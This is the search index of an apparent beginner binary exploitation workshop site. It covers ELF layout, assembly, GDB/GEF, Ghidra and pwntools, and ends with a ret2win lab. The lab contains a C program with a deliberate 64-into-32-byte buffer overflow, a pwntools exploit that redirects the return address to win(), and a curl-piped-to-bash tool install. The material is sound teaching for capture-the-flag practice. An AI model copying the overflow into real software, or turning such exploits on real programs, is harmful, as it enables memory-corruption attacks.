{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"01_Frame/","title":"\ud83d\udee0 Welcome Hackers!","text":"<p>Welcome to your first (and hopefully not last) step into the world of Binary Exploitation, where bugs can turn into deadly exploits. \ud83d\udc1b</p> <p>This workshop is hands-on, beginner-friendly, and designed for students with some programming experience who are curious about cybersecurity, reverse engineering, and the art of exploitation.</p>"},{"location":"01_Frame/#what-youll-learn","title":"\u2705 What You\u2019ll Learn","text":"<ul> <li>What binary exploitation is \u2014 and why it matters.</li> <li>Tools like Pwntools, Ghidra, and GDB.</li> <li>How to find and exploit bugs in binaries.</li> <li>Write your first exploit (ret2win).</li> <li>Think like a hacker \u2014 creative, methodical, persistent. MOST IMPORTANT</li> </ul>"},{"location":"01_Frame/#how-to-navigate","title":"\ud83e\udded How to Navigate","text":"<p>This workshop isn\u2019t your typical PowerPoint \u2014 it\u2019s built like a mini website you can explore at your own pace.</p> <ul> <li>Follow the sidebar for a guided path, or jump to sections you're curious about.</li> <li>Each section builds on the last, but you can revisit anything anytime..</li> </ul> <p>Think of it as a choose-your-own-adventure, but with exploits.</p>"},{"location":"01_Frame/#quick-tips","title":"\ud83d\udca1 Quick Tips","text":"<ul> <li>Skim, then explore.</li> <li>Try things as you read.</li> <li>Mistakes are part of learning.</li> <li>Be curious. Don\u2019t just wait for info to come to you \u2014 go after it, relentlessly.</li> <li>Don't make my mistake, don't understand something? Move on, come back later with a fresh mind.</li> </ul>"},{"location":"01_Frame/next-steps/","title":"\ud83d\udcda Further Resources &amp; Next Steps","text":"<p>You've taken your first steps into the world of binary exploitation \u2014 but there's much more to explore. Below are curated resources to help you continue your journey.</p>"},{"location":"01_Frame/next-steps/#practice-platforms","title":"\ud83e\udde0 Practice Platforms","text":"<p>Sharpen your skills by solving real challenges:</p> <ul> <li>picoCTF \u2013 Beginner-friendly CTF with binary challenges.</li> <li>OverTheWire: Narnia / Protostar \u2013 Legendary wargames focused on memory safety issues. (Classics)</li> <li>HackTheBox \u2013 Intermediate to advanced exploitation and system hacking labs.<ul> <li>Check the Challenges section</li> </ul> </li> <li>CTFtime \u2013 Find upcoming Capture The Flag competitions and challenges.</li> <li>TryHackMe: Binary Exploitation Room \u2013 Guided intro room.</li> </ul>"},{"location":"01_Frame/next-steps/#books-blogs","title":"\ud83d\udcd8 Books &amp; Blogs","text":"<p>Deepen your theoretical and practical understanding:</p> <ul> <li> <p>Books:</p> <ul> <li>Hacking: The Art of Exploitation by Jon Erickson</li> <li>The Shellcoder\u2019s Handbook</li> <li>Practical Binary Analysis by Dennis Andriesse</li> </ul> </li> <li> <p>Blogs:</p> <ul> <li>LiveOverflow \u2013 Great beginner and intermediate content with YouTube series.</li> <li>CTF Writeups Archive</li> <li>Trail of Bits Blog \u2013 Advanced security topics.</li> <li>Secret.Club - One of my favorite security blogs<ul> <li>Check out the binary exploit in CS:GO that lead to remote code execution</li> <li>https://secret.club/2021/05/13/source-engine-rce-join.html</li> </ul> </li> </ul> </li> </ul>"},{"location":"01_Frame/next-steps/#what-to-learn-next","title":"\ud83e\udded What to Learn Next","text":"<p>You now know about basic buffer overflows \u2014 here are the next logical steps:</p> <ul> <li> <p>\ud83d\udee1\ufe0f Learn Binary Protections &amp; How to Evade Them   Understand mitigations like <code>NX</code>, <code>ASLR</code>, <code>Stack Canaries</code>, <code>PIE</code>, <code>RELRO</code>, and how to bypass or defeat them.</p> </li> <li> <p>\ud83d\udd01 Return-Oriented Programming (ROP)   Learn how to chain gadgets together when you can\u2019t inject shellcode.</p> </li> <li> <p>\ud83d\udd22 Format String Vulnerabilities   Exploit <code>printf()</code> and similar functions to leak or write memory.</p> </li> <li> <p>\ud83d\udc1a Shellcoding &amp; Assembly   Write your own shellcode, understand syscall conventions.</p> </li> </ul> <p>Pro Tip \ud83d\udca1</p> <p>The best way to get better is to read writeups, recreate them, and eventually start writing your own.</p> <p>Keep pushing \u2014 you've just scratched the surface.</p>"},{"location":"01_Frame/whoami/","title":"\ud83d\udc64 <code>$ whoami</code>","text":"<p>Quote</p> <p>\"Know yourself and you will win all battles.\" \u2013 Sun Tzu</p>"},{"location":"01_Frame/whoami/#background","title":"\ud83e\udde0 Background","text":"<p>Hi, I\u2019m Bilal Al Tabbaa (spooky) \u2014 a student with a passion for cybersecurity, low-level hacking, and the art of binary exploitation. I'm learning with everyone as I go along, and in no way an expert or master.</p> <ul> <li>\ud83c\udf93 Field of Study: Computer Engineer / Cybersecurity</li> <li>\ud83e\udd4b Hobbies: BJJ, reading, lifting, hacking</li> <li>\ud83c\udf04 My Vision: Go deep in one craft, stay dangerous in the rest.</li> </ul>"},{"location":"01_Frame/whoami/#current-stack","title":"\ud83d\uddc2\ufe0f Current Stack","text":"<ul> <li>OS: Windows 10 / Kali WSL + Parrot OS Laptop</li> <li>Debugger: GDB + GEF</li> <li>Reversing: Ghidra</li> <li>Scripting: Python + Pwntools</li> <li>Editor: Obsidian + VSCode</li> <li>Help: Google + ChatGPT (\ud83d\ude2c)</li> </ul>"},{"location":"01_Frame/whoami/#contact","title":"\ud83d\udcac Contact","text":"<ul> <li>Instagram: [instagram.com/spooky_sec]</li> <li>GitHub: [github.com/SpookySec]</li> <li>Email / Phone Number: Please contact me privately and I'll be happy to share.</li> </ul> <p>\"Hack the planet.\" \ud83c\udf10</p>"},{"location":"02_Theory/01-intro/","title":"What is BinExp?","text":""},{"location":"02_Theory/01-intro/#what-is-binary-exploitation","title":"\ud83e\udde8 What is Binary Exploitation?","text":"<p>Binary exploitation is the art of taking advantage of flaws in a program to make it do something it wasn\u2019t supposed to \u2014 like giving you control over it.</p> <p>Imagine a program as a vending machine. You press buttons, and it follows a fixed set of instructions to give you a snack. But what if there's a flaw in the design \u2014 a hidden sequence that lets you get snacks for free, or even open the whole machine?</p> <p>That\u2019s binary exploitation: finding and using those hidden flaws to manipulate how software behaves.</p>"},{"location":"02_Theory/01-intro/#the-importance-of-binary-exploitation","title":"\ud83d\udca1 The Importance of Binary Exploitation","text":"<p>Okay great, we can exploit programs and make them do things we want, but why should I care?</p> <p>Because understanding how software breaks teaches you how it works.</p> <ul> <li>It\u2019s the foundation of real-world hacks \u2014 privilege escalation, malware, jailbreaks, CTFs, you name it.</li> <li>It forces you to think like an attacker \u2014 and that's exactly how defenders get better.</li> <li>It sharpens your low-level skills \u2014 memory, assembly, debugging \u2014 things most devs avoid, but hackers master.</li> <li>It\u2019s how security researchers discover and report zero-days.</li> <li>It\u2019s a valuable skillset \u2014 whether you\u2019re aiming for CTFs, red teaming, reverse engineering, or exploit dev.</li> </ul>"},{"location":"02_Theory/01-intro/#what-this-workshop-is-really-about","title":"\ud83d\udd27 What This Workshop Is Really About","text":"<p>We\u2019re not just here to memorize techniques.</p> <p>You\u2019ll learn to spot vulnerabilities, but more importantly, you\u2019ll learn to think and work like an exploiter:</p> <ul> <li>Getting hands-on with real tools like 01-gdb, 02-ghidra, and 03-pwntools.</li> <li>Understanding what\u2019s happening under the hood.</li> <li>Getting comfortable in unfamiliar territory \u2014 and learning to figure things out fast.</li> </ul> <p>Note</p> <p>Tool fluency matters more than exploit recipes. That\u2019s what separates a skilled hacker from someone who just copies code.</p>"},{"location":"02_Theory/01-intro/#core-tools-well-use","title":"\ud83d\udee0\ufe0f Core Tools We'll Use","text":"<p>Tools are the medium of interacting with our binaries. Nobody today (unless absolutely hardcore and insane) works directly with the 1s and 0s of computers.</p> <ul> <li>01-gdb \u2013 for live debugging and memory inspection.</li> <li>02-ghidra \u2013 for reverse engineering and static analysis.</li> <li>03-pwntools \u2013 a Python library for building and testing exploits.</li> </ul> <p>Learning these tools is key</p> <p>Techniques change. Tools change. But knowing how to explore and break binaries is what makes you effective.</p>"},{"location":"02_Theory/02-binary-execution/","title":"\ud83e\udde0 Understanding Binary Execution","text":""},{"location":"02_Theory/02-binary-execution/#elf-file-top-to-bottom","title":"\ud83d\udd0d ELF File: Top to Bottom","text":"<p>ELF files have a well-defined structure, which lets the OS load and run programs correctly. To analyze or exploit binaries, it helps to understand this layout step-by-step \u2014 just like opening a file and inspecting its parts.</p>"},{"location":"02_Theory/02-binary-execution/#1-elf-header-files-table-of-contents","title":"1. ELF Header (File's \"Table of Contents\")","text":"<p>The ELF header is at the very top of the file. It tells us:</p> <ul> <li>What kind of file it is (executable, shared object, etc.)</li> <li>The target architecture (e.g., x86_64)</li> <li>The entry point address (where execution begins)</li> <li>Where to find the program headers and section headers in the file</li> </ul> <p>You can see this info with:</p> <pre><code>$ readelf -h /bin/ls       \nELF Header:\n  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 \n  Class:                             ELF64\n  Data:                              2's complement, little endian\n  Version:                           1 (current)\n  OS/ABI:                            UNIX - System V\n  ABI Version:                       0\n  Type:                              DYN (Position-Independent Executable file)\n  Machine:                           Advanced Micro Devices X86-64\n  Version:                           0x1\n  Entry point address:               0x6aa0\n  Start of program headers:          64 (bytes into file)\n  Start of section headers:          136232 (bytes into file)\n  Flags:                             0x0\n  Size of this header:               64 (bytes)\n  Size of program headers:           56 (bytes)\n  Number of program headers:         13\n  Size of section headers:           64 (bytes)\n  Number of section headers:         31\n  Section header string table index: 30\n</code></pre>"},{"location":"02_Theory/02-binary-execution/#2-program-headers-memory-mapping-instructions","title":"2. Program Headers (Memory Mapping Instructions)","text":"<p>Program headers describe how the file should be loaded into memory. They specify which parts of the file become segments in memory, and their permissions (read, write, execute).</p> <p>For exploitation, these tell us:</p> <ul> <li>Where the code segment (<code>.text</code>) is loaded</li> <li>Where data segments (<code>.data</code>, <code>.bss</code>) go</li> <li>Stack and heap locations aren\u2019t here but are managed at runtime</li> </ul> <p>Inspect with:</p> <pre><code>$ readelf -l /bin/ls\n\nElf file type is DYN (Position-Independent Executable file)\nEntry point 0x6aa0\nThere are 13 program headers, starting at offset 64\n\nProgram Headers:\n  Type           Offset             VirtAddr           PhysAddr\n                 FileSiz            MemSiz              Flags  Align\n  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040\n                 0x00000000000002d8 0x00000000000002d8  R      0x8\n  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318\n                 0x000000000000001c 0x000000000000001c  R      0x1\n      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]\n  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000\n                 0x0000000000003458 0x0000000000003458  R      0x1000\n  LOAD           0x0000000000004000 0x0000000000004000 0x0000000000004000\n                 0x0000000000013091 0x0000000000013091  R E    0x1000\n  LOAD           0x0000000000018000 0x0000000000018000 0x0000000000018000\n\n...\n</code></pre> Flag Meaning <code>R</code> Readable <code>W</code> Writable <code>X</code> Executable <code>A</code> Allocated (loaded in memory)"},{"location":"02_Theory/02-binary-execution/#3-section-headers-file-organization","title":"3. Section Headers (File Organization)","text":"<p>Sections are like pieces inside the file used during linking and debugging. Key sections include:</p> <ul> <li><code>.text</code> \u2014 contains executable instructions</li> <li><code>.data</code> / <code>.bss</code> \u2014 global/static initialized and uninitialized variables</li> <li><code>.rodata</code> \u2014 read-only data like strings</li> <li><code>.plt/.got</code> \u2014 jump tables for dynamic linking (important for exploits)</li> </ul> <p>Sections organize the file\u2019s content but aren\u2019t always loaded contiguously in memory.</p> <p>Check with:</p> <pre><code>readelf -S /bin/ls       \nThere are 31 section headers, starting at offset 0x21428:\n\nSection Headers:\n  [Nr] Name              Type             Address           Offset\n       Size              EntSize          Flags  Link  Info  Align\n  [ 0]                   NULL             0000000000000000  00000000\n       0000000000000000  0000000000000000           0     0     0\n  [ 1] .interp           PROGBITS         0000000000000318  00000318\n       000000000000001c  0000000000000000   A       0     0     1\n  [ 2] .note.gnu.pr[...] NOTE             0000000000000338  00000338\n       0000000000000030  0000000000000000   A       0     0     8\n  [ 3] .note.gnu.bu[...] NOTE             0000000000000368  00000368\n       0000000000000024  0000000000000000   A       0     0     4\n  [ 4] .note.ABI-tag     NOTE             000000000000038c  0000038c\n       0000000000000020  0000000000000000   A       0     0     4\n  [ 5] .gnu.hash         GNU_HASH         00000000000003b0  000003b0\n       000000000000004c  0000000000000000   A       6     0     8\n...\n  [16] .text             PROGBITS         0000000000004ce0  00004ce0\n       00000000000123a2  0000000000000000  AX       0     0     16\n  [17] .fini             PROGBITS         0000000000017084  00017084\n       000000000000000d  0000000000000000  AX       0     0     4\n  [18] .rodata           PROGBITS         0000000000018000  00018000\n       0000000000004dcc  0000000000000000   A       0     0     32\n...\n  [25] .got              PROGBITS         0000000000021c58  00020c58\n       00000000000003a0  0000000000000008  WA       0     0     8\n  [26] .data             PROGBITS         0000000000022000  00021000\n       0000000000000278  0000000000000000  WA       0     0     32\n  [27] .bss              NOBITS           0000000000022280  00021278\n       00000000000012c0  0000000000000000  WA       0     0     32\n</code></pre> <p></p>"},{"location":"02_Theory/02-binary-execution/#4-in-memory-layout-what-really-matters","title":"4. In-Memory Layout (What Really Matters)","text":"<p>When the program runs, the loader maps these segments into memory:</p> <ul> <li>The code lives in an executable segment (from <code>.text</code>)</li> <li>The data lives in writable segments (<code>.data</code>, <code>.bss</code>)</li> <li>The stack is set up for local variables and function calls</li> <li>The heap is used for dynamic memory allocation (<code>malloc</code>, etc.)</li> </ul> <p>Your goal as an exploiter is to understand how user input flows into memory regions and how those affect program control flow.</p>"},{"location":"02_Theory/02-binary-execution/#summary","title":"\ud83d\udd11 Summary","text":"<ul> <li>The ELF header points to program and section headers</li> <li>Program headers describe memory layout</li> <li>Sections organize the file\u2019s contents</li> <li>Understanding this layout helps you trace where code and data live, which is crucial for exploitation</li> </ul> <p>Overwhelmed?</p> <p>I was too, and still am. Give it time and it'll become natural.</p>"},{"location":"02_Theory/03-assembly/","title":"Assembly Basics","text":""},{"location":"02_Theory/03-assembly/#basics-of-assembly-language-x86x86-64","title":"\u2699\ufe0f Basics of Assembly Language (x86/x86-64)","text":"<p>Assembly is the low-level language closest to machine code. Learning some basics helps you understand how binaries work and how to craft exploits. Important Registers:</p> <ul> <li><code>rax</code>, <code>rbx</code>, <code>rcx</code>, <code>rdx</code>: General-purpose (often used for math, arguments, returns)</li> <li><code>rsp</code>: Stack pointer (points to the top of the stack)</li> <li><code>rbp</code>: Base pointer (marks the base of the current stack frame)</li> <li><code>rip</code>: Instruction pointer (points to the next instruction to execute)</li> </ul>"},{"location":"02_Theory/03-assembly/#common-instructions","title":"Common Instructions:","text":"Instruction Description <code>mov rax, 0x1</code> Move the value <code>0x1</code> into register <code>rax</code> <code>add rax, rbx</code> Add the value in <code>rbx</code> to <code>rax</code> <code>cmp rax, rbx</code> Compare <code>rax</code> and <code>rbx</code> <code>jmp 0x400123</code> Jump to the instruction at address <code>0x400123</code> <code>call function</code> Call a function (pushes return address on stack) <code>ret</code> Return from function (pops return address)"},{"location":"02_Theory/03-assembly/#example","title":"Example:","text":"<p><pre><code>mov rax, 0x1\nadd rax, 0x2\nret\n</code></pre>     ^ This moves 1 into <code>rax</code>, adds 2, and returns \u2014 <code>rax</code> now holds 3.</p>"},{"location":"02_Theory/03-assembly/#tools-for-assembly-analysis","title":"\ud83d\udd27 Tools for Assembly Analysis:","text":"<ul> <li><code>objdump -d -M intel [file]</code> \u2014 Disassemble executable code (Intel syntax)</li> <li><code>gdb [file]</code> \u2014 Debug binary interactively at runtime</li> </ul>"},{"location":"02_Theory/03-assembly/#final-tips","title":"\ud83d\udca1 Final Tips:","text":"<p>Assembly isn't learned overnight, it takes time and practice \u2014 don\u2019t get discouraged! Always keep references handy and look up instructions as you go.</p>"},{"location":"03_Tools/01-gdb/","title":"GDB","text":"<p> ^ (default GDB \u2013 no extra tools, no context window, very basic)</p>"},{"location":"03_Tools/01-gdb/#what-is-gdb","title":"\ud83d\udee0\ufe0f What is GDB?","text":"<p>GDB is the standard GNU debugger used by Linux developers to debug compiled applications \u2014 but for exploit developers, it\u2019s an essential tool to reverse and break things!</p>"},{"location":"03_Tools/01-gdb/#try-it-yourself","title":"\ud83e\uddea Try It Yourself","text":"<pre><code>$ gdb -q /bin/ls\n(gdb) start\n</code></pre> <p>This opens <code>/bin/ls</code> in GDB and begins execution right before <code>main()</code>.</p>"},{"location":"03_Tools/01-gdb/#whats-a-debugger-really","title":"\ud83d\udd79\ufe0f What\u2019s a Debugger, Really?","text":"<p>A debugger is like a time machine for programs: You can pause, inspect, step through, or even change execution on the fly.</p> <p>For exploit developers, it\u2019s invaluable for:</p> <ul> <li>Analyzing control flow  </li> <li>Watching memory in real time  </li> <li>Testing and refining payloads  </li> </ul>"},{"location":"03_Tools/01-gdb/#why-gdb-matters-for-exploit-devs","title":"\ud83d\udca3 Why GDB Matters for Exploit Devs","text":"<p>While developers use GDB to fix bugs, exploit devs use it to find them.</p> <p>You\u2019ll:</p> <ul> <li>Inspect registers and stack at crash points</li> <li>Set breakpoints to trap execution at the right time</li> <li>Craft and debug shellcode or ROP chains step by step</li> </ul>"},{"location":"03_Tools/01-gdb/#gef-gdb-enhanced-features","title":"\ud83d\udc89 GEF \u2013 GDB Enhanced Features","text":"<p> ^ (GEF loaded \u2013 colorful, structured UI, context-aware)</p> <p>While vanilla GDB works, it\u2019s\u2026 minimal.</p> <p>That\u2019s where GEF (GDB Enhanced Features) comes in. It provides: - A better UI with a clear context window - Syntax highlighting and register coloring - Built-in commands for heap analysis, format string exploits, syscall tracing, and more</p>"},{"location":"03_Tools/01-gdb/#installing-gef","title":"\ud83d\ude80 Installing GEF","text":"<p>Installation is super simple:</p> <pre><code>bash -c \"$(curl -fsSL https://gef.blah.cat/sh)\"\n</code></pre> <p>This script safely adds the plugin to your <code>~/.gdbinit</code> so GEF loads automatically whenever you start GDB.</p>"},{"location":"03_Tools/01-gdb/#final-tip","title":"\ud83e\udded Final Tip","text":"<p>\ud83d\udca1 Always use GDB with GEF for binary exploitation. It speeds up learning and makes debugging binaries 10x more intuitive.</p> <p>If you're feeling fancy later, you can also explore: - Pwndbg \u2013 another GDB plugin with exploit dev features</p> <p>Tip</p> <p>\ud83e\udde0 Mastering GDB is one of the best investments you can make as an exploit developer.</p>"},{"location":"03_Tools/02-ghidra/","title":"Ghidra","text":""},{"location":"03_Tools/02-ghidra/#what-is-ghidra","title":"\ud83e\udde0 What is Ghidra?","text":"<p>Ghidra is a powerful open-source reverse engineering tool developed by the NSA. It helps you analyze compiled programs by converting machine code into a human-readable format.</p> <p>Perfect for reverse engineers, vulnerability researchers, and binary exploit devs.</p>"},{"location":"03_Tools/02-ghidra/#installation","title":"\ud83d\udce6 Installation","text":"<p>\ud83d\udd17 Download the latest release</p> <p>Note: Java OpenJDK must be installed (JDK 17+ recommended).</p>"},{"location":"03_Tools/02-ghidra/#try-it-yourself","title":"\ud83d\ude80 Try It Yourself","text":"<p>Launch Ghidra with:</p> <pre><code>./ghidraRun\n</code></pre> <p>Then:</p> <ol> <li>Create a new project.</li> <li>Import a binary like <code>/bin/ls</code>.</li> <li>Double-click the binary to open it in CodeBrowser.</li> </ol> <p>\ud83c\udf89 You've just disassembled your first binary!</p>"},{"location":"03_Tools/02-ghidra/#whats-a-disassembler-vs-decompiler","title":"\ud83e\uddf0 What\u2019s a Disassembler vs Decompiler?","text":"<ul> <li> <p>\ud83d\udd0d Disassembler </p> <p>Translates machine code into assembly code, instruction by instruction.</p> </li> <li> <p>\ud83e\uddec Decompiler </p> <p>Attempts to recreate the original source code from machine code.</p> </li> </ul> <p>\u26a0\ufe0f Decompilers aren't perfect \u2014 especially if the binary uses anti-reversing techniques.</p>"},{"location":"03_Tools/02-ghidra/#why-is-this-useful-for-exploit-devs","title":"\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Why Is This Useful for Exploit Devs?","text":"<p>When you don't have the source code:</p> <ul> <li>You can find important functions</li> <li>Analyze control flow and logic</li> <li>Spot potential vulnerabilities </li> <li>Understand how user input is handled</li> </ul> <p>\ud83e\udde9 Reverse engineering is half the battle in binary exploitation \u2014 and Ghidra makes it accessible and visual.</p> <p>\ud83d\udd17 Later on, try pairing Ghidra with tools like: - <code>gdb</code> for dynamic analysis - <code>pwntools</code> for scripting exploits</p> <p>Pro Tip \ud83d\udca1</p> <p>Learn the Ghidra hotkeys \u2014 they\u2019ll save you tons of time.</p>"},{"location":"03_Tools/03-pwntools/","title":"Pwntools","text":""},{"location":"03_Tools/03-pwntools/#what-is-pwntools","title":"\ud83d\udc0d What is Pwntools?","text":"<p>Pwntools is a Python library built for exploit development. It makes it easy to:</p> <ul> <li>Automate interaction with binaries and processes</li> <li>Craft payloads and shellcode</li> <li>Bypass protections with elegant, scriptable logic</li> </ul> <p>Whether you're CTF-ing or writing real-world exploits, Pwntools is your best friend.</p>"},{"location":"03_Tools/03-pwntools/#installation","title":"\ud83e\uddf0 Installation","text":"<p>Make sure your system is ready, then install Pwntools:</p> <pre><code>$ sudo apt-get update\n$ sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\n$ python3 -m pip install --upgrade pip\n$ python3 -m pip install --upgrade pwntools\n</code></pre>"},{"location":"03_Tools/03-pwntools/#try-it-yourself","title":"\ud83d\ude80 Try It Yourself","text":"<p>Launch a binary using Pwntools in just a few lines:</p> <pre><code>from pwn import *\n\np = process(\"/bin/ls\")\np.interactive()\n</code></pre> <p>You've just spun up a binary and gained interactive control over it \u2014 all in Python!</p>"},{"location":"03_Tools/03-pwntools/#why-use-pwntools","title":"\ud83e\udd16 Why Use Pwntools?","text":"<p>Instead of manually interacting with GDB or a terminal, Pwntools lets you:</p> <ul> <li>Send/receive input and output from programs</li> <li>Automate full exploitation workflows</li> <li>Format payloads and generate shellcode</li> <li>Work locally or connect to remote services</li> </ul>"},{"location":"03_Tools/03-pwntools/#pwntools-for-exploit-development","title":"\ud83d\udca5 Pwntools for Exploit Development","text":"<p>Pwntools makes your exploit scripts:</p> <ul> <li>Repeatable \u2014 easily test and tweak without manual work</li> <li>Readable \u2014 clear logic, clean syntax</li> <li>Flexible \u2014 interact locally or over the network</li> </ul> <p>Note</p> <p>\ud83d\udd01 Exploit dev is trial and error \u2014 Pwntools makes iteration painless.</p> <p>\ud83e\udde0 Bonus: Combine Pwntools with GDB (via <code>gdb.attach(p)</code>) to debug live during exploit dev!</p> <p>\ud83d\udca1 Explore the Pwntools docs to unlock powerful tools like:</p> <ul> <li><code>p32()</code> / <code>u64()</code> for packing/unpacking</li> <li><code>asm()</code> and <code>shellcraft</code> for shellcode</li> <li><code>ROP()</code> for crafting ROP chains</li> </ul>"},{"location":"04_Exploits/01-goal/","title":"\ud83e\udde8 The Goal","text":""},{"location":"04_Exploits/01-goal/#the-setup","title":"\ud83d\udd0d The Setup","text":"<p>We have a binary named <code>exploitme</code>. Inside it:</p> <ul> <li>There\u2019s a function called <code>win()</code>.</li> <li>It contains the flag we want.</li> <li>But it\u2019s never called in the program\u2019s normal execution.</li> </ul>"},{"location":"04_Exploits/01-goal/#the-goal_1","title":"\ud83e\udde0 The Goal","text":"<p>Call the <code>win()</code> function by exploiting the program.</p>"},{"location":"04_Exploits/01-goal/#main","title":"\ud83d\udd0e <code>main()</code>","text":"<p>It really doesn't get simpler than this:</p> <p></p> <p>No signs of <code>win()</code> being called directly... Suspicious, right?</p> <p>But wait \u2014 something interesting pops up:</p> <p>The program allocates a buffer of 32 bytes:</p> <pre><code>char local_28[32];\n</code></pre> <p>Then proceeds to read 64 bytes of input.</p>"},{"location":"04_Exploits/01-goal/#conclusion","title":"\u2705 Conclusion","text":"<p>So no, <code>win()</code> isn\u2019t called anywhere in the code...</p> <p>But we\u2019re going to make it happen.</p> <p>By spotting the bug in the code, we can make it do whatever want.</p> <p>\ud83e\udde0 Welcome to the world of binary exploitation \u2014 where the right input breaks everything just enough.</p>"},{"location":"04_Exploits/02-plan/","title":"\ud83e\udde0 The Plan","text":""},{"location":"04_Exploits/02-plan/#the-basics","title":"\ud83e\udde9 The Basics","text":"<p>Most memory and low-level exploits stem from bad memory management. This is an inherent flaw in languages like C/C++, which:</p> <ul> <li>Allow direct memory access</li> <li>Don't enforce memory safety</li> <li>Lack features like garbage collection or scoped memory management</li> </ul>"},{"location":"04_Exploits/02-plan/#example-c-code","title":"\ud83d\udccc Example C Code","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid win() {\n    printf(\"win() called!\\nHere's your flag: flag{dummy_flag}\\n\");\n}\n\nint main(void) {\n    char name[32];   // Buffer of 32 bytes\n\n    fgets(name, 64, stdin); // Reading 64 bytes into a 32-byte buffer\n}\n</code></pre>"},{"location":"04_Exploits/02-plan/#whats-the-issue","title":"\u2753 What\u2019s the issue?","text":"<p>What happens when you overfill a water bucket?</p> <p>It overflows! \ud83d\udca5</p> <p>That\u2019s exactly what happens here \u2014 we overflow the <code>name</code> buffer.</p>"},{"location":"04_Exploits/02-plan/#what-is-a-buffer-overflow","title":"\ud83d\udca3 What is a Buffer Overflow?","text":"<p>We're simply filling the buffer until we reach critical data \u2014 like the return address (shown above in red).</p> <p>If we can control the value written to the return address...</p> <p>We can control where the program jumps to next.</p> <p>Think of it like hijacking a plane:</p> <ul> <li>It\u2019s headed to a predefined destination (the original return address).</li> <li>But you take over, and reroute it somewhere else \u2014 like <code>win()</code>!</li> </ul>"},{"location":"04_Exploits/02-plan/#in-practice","title":"\ud83e\uddea In Practice","text":"<p>Before launching an attack, we reverse engineer the binary to find vulnerabilities.</p> <p>Here\u2019s a sample exploit script using <code>pwntools</code>:</p> <pre><code>from pwn import *\n\nelf = context.binary = ELF('./exploitme')\n\np = elf.process()\noffset = 40\n\npayload = b''\npayload += b'A' * offset\npayload += pack(0x401136)  # Address of win()\n\nprint('\\n-=-=-=-=-=-=-=-=-=-=-=-')\nprint(hexdump(payload))\nprint('-=-=-=-=-=-=-=-=-=-=-=-\\n')\ninfo(f'Payload length: {len(payload)}')\n\ninfo('Sending exploit...\\n\\n')\n\np.sendline(payload)\nprint(p.recv().decode())\n</code></pre>"},{"location":"04_Exploits/03-action/","title":"\ud83c\udfaf The Action","text":"<p>You've built the exploit... now let\u2019s see it in action.</p>"},{"location":"04_Exploits/03-action/#step-by-step-execution","title":"\ud83e\uddea Step-by-Step Execution","text":""},{"location":"04_Exploits/03-action/#1-crash","title":"1. \ud83d\udca5 Crash","text":"<p>Let\u2019s run the binary in <code>gdb</code> to verify our control over the return address.</p> <pre><code>$ gdb ./exploitme\ngef\u27a4 start\ngef\u27a4 pattern create 100\n</code></pre>"},{"location":"04_Exploits/03-action/#2-inspect","title":"2. \ud83d\udd0d Inspect","text":"<p>Paste that pattern into the binary\u2019s input and crash it. Then:</p> <pre><code>gef\u27a4 info registers\ngef\u27a4 pattern offset [value of RIP]\n</code></pre> <p>\ud83d\udd0d This gives you the exact offset to control the instruction pointer.</p>"},{"location":"04_Exploits/03-action/#3-launch-the-final-exploit","title":"3. \ud83d\ude80 Launch the Final Exploit","text":"<p>Now let\u2019s run the Python script from earlier:</p> <pre><code>$ python3 exploit.py\n</code></pre> <p>If everything is correct, you\u2019ll see:</p> <pre><code>win() called!\nHere's your flag: flag{dummy_flag}\n</code></pre> <p>Boom \ud83d\udca5 You\u2019ve hijacked execution and landed in <code>win()</code>!</p>"},{"location":"04_Exploits/03-action/#debugging-tips","title":"\ud83d\udee0\ufe0f Debugging Tips","text":"<ul> <li>Use <code>hexdump(payload)</code> to inspect payload contents.</li> <li>Use <code>gdb.attach(p)</code> in the script for live debugging:</li> </ul> <pre><code>p = elf.process()\ngdb.attach(p)\n</code></pre> <p>This lets you hit breakpoints and inspect memory/registers during the attack.</p>"},{"location":"04_Exploits/03-action/#recap","title":"\u2705 Recap","text":"<ul> <li>You found a buffer overflow.</li> <li>Calculated the offset to RIP.</li> <li>Redirected control to the <code>win()</code> function.</li> <li>Got the flag. \ud83c\udf89</li> </ul> <p>Now you're thinking like an exploiter. \ud83e\udde0\ud83d\udc80</p>"}]}